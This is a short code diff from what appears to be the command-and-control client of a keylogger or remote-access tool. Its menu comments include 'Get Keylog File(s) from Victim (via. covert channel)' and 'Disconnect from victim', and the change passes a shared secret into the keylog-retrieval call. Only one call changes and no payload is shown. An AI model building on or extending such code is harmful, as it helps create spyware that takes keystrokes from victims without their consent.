@@ -58,7 +58,7 @@ if __name__ == '__main__':
 
                 # MENU ITEM 4 - Get Keylog File(s) from Victim (via. covert channel)
                 if command == constants.PERFORM_MENU_ITEM_FOUR:
-                    perform_menu_item_4(connected_clients, source_ip, source_port)
+                    perform_menu_item_4(connected_clients, source_ip, source_port, shared_secret)
 
                 # MENU ITEM 5 - Disconnect from victim
                 if command == constants.PERFORM_MENU_ITEM_FIVE:
